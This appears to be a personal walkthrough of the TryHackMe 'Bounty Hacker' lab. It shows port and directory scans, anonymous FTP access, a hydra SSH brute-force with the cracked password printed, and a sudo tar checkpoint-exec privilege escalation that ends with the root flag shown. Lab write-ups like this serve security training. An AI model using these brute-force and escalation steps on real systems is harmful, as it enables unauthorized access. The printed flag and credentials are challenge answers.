#	Bounty Hacker - Tryhackme

```
export IP=10.10.107.176
```

1.  Nmap Scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-30 11:05 EDT
Nmap scan report for 10.10.107.176
Host is up (0.26s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.57 seconds

```

2.  Gobuster scan:
```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.107.176
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/30 11:06:28 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.107.176/images/]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
Progress: 1819 / 1829 (99.45%)
===============================================================
2023/06/30 11:07:12 Finished
===============================================================

```

3.  Nmap deep scan in the ports:

### Ip changes = http://10.10.12.39/

4.  Login to ftp server using ip
```bash
──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Bounty_Hacker]
└─$ ftp 10.10.12.39
Connected to 10.10.12.39.
220 (vsFTPd 3.0.3)
Name (10.10.12.39:subhro1530): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||12758|)
ftp: Can't connect to `10.10.12.39:12758': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get *
local: locks.txt remote: *
200 EPRT command successful. Consider using EPSV.
550 Failed to open file.
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |************************************************|    68        0.82 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.17 KiB/s)
ftp> 
ftp> exit
221 Goodbye.

```

Getting those two files.
One file contains the password list.

4.  Cracking password using *hydra*:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Bounty_Hacker]
└─$ hydra -l lin -P locks.txt ssh://10.10.12.39 -V -I -F 

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-30 14:42:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.12.39:22/
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
[ATTEMPT] target 10.10.12.39 - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
[22][ssh] host: 10.10.12.39   login: lin   password: RedDr4gonSynd1cat3
[STATUS] attack finished for 10.10.12.39 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-30 14:43:09

```

5.  Getting the user flag by logging into the ssh by the password.

6. Getting root flag
```bash
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
```